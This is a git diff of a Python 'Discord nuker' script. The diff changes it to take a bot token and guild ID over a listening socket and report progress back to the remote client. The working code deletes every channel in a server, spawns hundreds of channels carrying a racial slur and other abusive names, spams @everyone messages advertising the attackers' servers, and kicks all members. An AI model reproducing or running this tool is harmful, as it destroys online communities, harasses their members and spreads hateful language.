@@ -1,16 +1,7 @@
 from os import system
-def print_logo():
-    system("cls || clear")
-    print("""
-     _   _       _             
-    | \ | |_   _| | _____ _ __ 
-    |  \| | | | | |/ / _ \ '__|
-    | |\  | |_| |   <  __/ |   
-    |_| \_|\__,_|_|\_\___|_|   
-                                                       
-        Made by kingslin420
-    """)
-print_logo()
+import socket
+
+
 try: 
     import requests
     import time
@@ -25,11 +16,13 @@ except:
     system("python -m pip install discord")
     print("All modules installed, please restart the script.")
     input("Press enter to restart...")
-print_logo()
+
 # All parameters 
-TOKEN = input("Please enter bot token: ")
-LINK = 'https://discord.gg/scansquad Server nuked by ScanSquad'
-COMMAND_PREFIX = '!'
+TOKEN = ''
+GUILD = ''
+server_port = 25567
+LINK = 'https://discord.gg/kingstavern https://discord.gg/scansquad  ScanSquad x KingsTavern'
+client_socket = ''
 MESSAGES = [
     '@everyone Hacked By ' +LINK,
     '@everyone Fucked By ' +LINK,
@@ -42,12 +35,24 @@ CHANNEL_NAMES = [
     'Nuked',
     'Nigger'
 ]
-GUILD = int(input("Enter guild id: "))
 
+print("Creating server instance...")
+def create_and_handle_server():
+    global TOKEN, GUILD, client_socket
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind(("0.0.0.0", server_port))
+    server_socket.listen(1)
+    print("Created server instance, now listening for connections...")
+    client_socket, client_address = server_socket.accept()
+    print(f"Connection from {client_address}")
+    TOKEN = client_socket.recv(1024).decode('utf-8')
+    print(TOKEN)
+    GUILD = int(client_socket.recv(1024).decode('utf-8'))
+    print(GUILD)
 
+create_and_handle_server()
 
 headers = {'authorization': f'Bot {TOKEN}'}
-
 
 def get_all_channels():
     while True:
@@ -68,13 +73,13 @@ def remove_channel(chnl):
             time.sleep(r.json()['retry_after'])
         else:
             if r.status_code in [200, 201, 204]:
-                print(f"[Success] Removed channel: {chnl}")
+                print_to_client_socket(f"[Success] Removed channel: {chnl}")
                 return
             else:
-                print(f"[Fail] Cannot remove channel. Status: {r.status_code}. Retrying... Current strike: {strike}")
+                print_to_client_socket(f"[Fail] Cannot remove channel. Status: {r.status_code}. Retrying... Current strike: {strike}")
                 strike+=1
                 if strike > 3:
-                    print("[Srike] Strike limit has been reached. Quiting thread.")
+                    print_to_client_socket("[Srike] Strike limit has been reached. Quiting thread.")
                     return
     
 def channel(name):
@@ -86,7 +91,7 @@ def channel(name):
         else:
             if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                 id = r.json()["id"]
-                print(f"[Success] Created a channel with name: {name} ID: {id}")
+                print_to_client_socket(f"[Success] Created a channel with name: {name} ID: {id}")
                 threading.Thread(target=send_message, args=(id,)).start()
                 return
             else:
@@ -102,28 +107,18 @@ def kick_member(id):
 
 # Check if the request was successful
     if r.status_code == 204:
-        print(f'[Success] Kicked {id} successfully!')
+        print_to_client_socket(f'[Success] Kicked {id} successfully!')
     else:
-        print(f'Failed to kick member. Status code: {r.status_code}, Response: {r.text}')
+        print_to_client_socket(f'Failed to kick member. Status code: {r.status_code}, Response: {r.text}')
 
 def remove_channels():
     for channel_id in channel_ids:
         threading.Thread(target=remove_channel, args=(channel_id,)).start()
-        print("[Thread] Created thread for removing channels")
+        print_to_client_socket("[Thread] Created thread for removing channels")
 
 def spam_channels(CHANNEL_NAME):
     for i in range(20):
         channel(f"{CHANNEL_NAME}")
-
-channel_ids = [channel['id'] for channel in get_all_channels()]
-if len(channel_ids) != 0:
-    remove_channels()
-else:
-    print("No channels found.")
-for _ in range(50):
-    threading.Thread(target=channel, args=(random.choice(CHANNEL_NAMES),)).start()
-    print("[Thread] Created thread for creating channels")
-
 
 def kick():
     intents = discord.Intents.all()
@@ -132,7 +127,7 @@ def kick():
     bot = commands.Bot(command_prefix='!', intents=intents)
     @bot.event
     async def on_ready():
-        print(f'Logged in as {bot.user.name}')
+        print_to_client_socket(f'Logged in as {bot.user.name}')
         await kick_all_members()
 
     async def kick_all_members():
@@ -145,17 +140,47 @@ def kick():
                 try:
                     
                     await member.kick(reason="Kicked all members")
-                    print(f'[Success] Kicked: {member.name}#{member.discriminator}')
+                    print_to_client_socket(f'[Success] Kicked: {member.name}#{member.discriminator}')
                     i += 1
                 except discord.Forbidden:
                     k += 1
-                    print(f'[Fail] Can\'t kick: {member.name}#{member.discriminator} (Permission Denied)')
-            print(f"[Info] Member kick loop finished, kicked: {i}, failed: {k}, total: {i+k}")
+                    print_to_client_socket(f'[Fail] Can\'t kick: {member.name}#{member.discriminator} (Permission Denied)')
+            print_to_client_socket(f"[Info] Member kick loop finished, kicked: {i}, failed: {k}, total: {i+k}")
         else:
-            print(f'Guild not found.')
+            print_to_client_socket(f'Guild not found.')
 
 
     bot.run(TOKEN)
 
-time.sleep(5)
-kick()
+def kick_wait():
+    time.sleep(5)
+    kick()
+def print_to_client_socket(a):
+    print(a)
+    client_socket.send(a.encode('utf-8'))
+
+
+
+def print_logo():
+    print_to_client_socket("""
+     _   _       _             
+    | \ | |_   _| | _____ _ __ 
+    |  \| | | | | |/ / _ \ '__|
+    | |\  | |_| |   <  __/ |   
+    |_| \_|\__,_|_|\_\___|_|   
+                                                       
+        Made by kingslin420
+    """)
+print_logo()
+
+channel_ids = [channel['id'] for channel in get_all_channels()]
+if len(channel_ids) != 0:
+    remove_channels()
+else:
+    print_to_client_socket("No channels found.")
+threading.Thread(target=kick_wait).start()
+for _ in range(500):
+    threading.Thread(target=channel, args=(random.choice(CHANNEL_NAMES),)).start()
+    print_to_client_socket("[Thread] Created thread for creating channels")
+
+
